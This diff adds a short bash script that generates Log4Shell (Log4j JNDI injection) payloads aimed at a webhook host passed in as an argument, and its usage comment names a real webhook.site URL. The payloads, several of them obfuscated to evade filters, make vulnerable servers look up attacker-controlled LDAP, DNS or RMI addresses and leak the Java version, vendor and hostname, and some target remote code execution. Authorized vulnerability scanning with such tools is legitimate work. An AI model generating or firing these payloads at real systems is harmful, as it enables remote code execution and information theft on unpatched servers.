@@ -1,0 +1,14 @@
+#!/bin/bash
+# ./jndi_payload_generation webhook.site/e607bc03-ac0e-47de-b86e-59f57d73bc19
+
+webhook=$1
+
+echo '${jndi:ldap://${java:version}.'$1'/a}'| tee -a jndi.txt
+echo '${jndi:ldap://${env:JAVA_VERSION}.'$1'/a}'| tee -a jndi.txt
+echo '${jndi:ldap://${sys:java.version}.'$1'/a}'| tee -a jndi.txt
+echo '${jndi:ldap://${sys:java.vendor}.'$1'/a}'| tee -a jndi.txt
+echo '${jndi:ldap://${hostName}.'$1'/a}'| tee -a jndi.txt
+echo '${jndi:dns://${hostName}.'$1'/a}'| tee -a jndi.txt
+echo '${${lower:jndi}:${lower:rmi}://'$1'/poc}'| tee -a jndi.txt
+echo '${j${loWer:Nd}i${uPper::}://'$1'/poc}'| tee -a jndi.txt
+echo '${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}'$1'/rce}'| tee -a jndi.txt
